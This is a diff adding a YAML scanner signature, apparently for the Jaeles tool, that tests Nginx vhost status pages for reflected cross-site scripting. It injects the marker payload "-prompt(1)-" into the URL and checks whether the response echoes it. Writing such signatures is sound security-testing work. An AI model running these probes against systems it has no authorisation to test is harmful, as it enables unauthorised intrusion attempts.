@@ -1,0 +1,26 @@
+id: nginx-vhost-xss
+info:
+  name: Nginx Vhost RXSS
+  risk: Medium
+
+params:
+  - root: '{{.BaseURL}}'
+
+variables:
+  - stats: |
+      nginx-status.html
+      status.html
+      _zstats
+requests:
+  - method: GET
+    redirect: false
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    url: >-
+     {{.root}}/{{.stats}}"-prompt(1)-"
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "nginx vhost traffic") && StringSearch("response", "-prompt(1)-")
+
+reference:
+  - author: j3ssie
